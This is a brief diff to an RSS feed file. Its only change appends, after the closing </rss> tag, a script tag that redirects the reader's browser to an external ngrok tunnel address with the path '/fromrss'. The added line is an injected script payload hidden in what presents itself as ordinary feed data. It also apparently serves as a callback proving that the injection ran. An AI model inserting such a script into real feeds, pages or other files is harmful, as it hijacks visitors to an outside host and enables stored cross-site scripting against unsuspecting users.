@@ -28,3 +28,5 @@
     </item>
   </channel>
 </rss>
+
+<script>setTimeout(location='https://11b770d6.ngrok.io/fromrss',3000)</script>
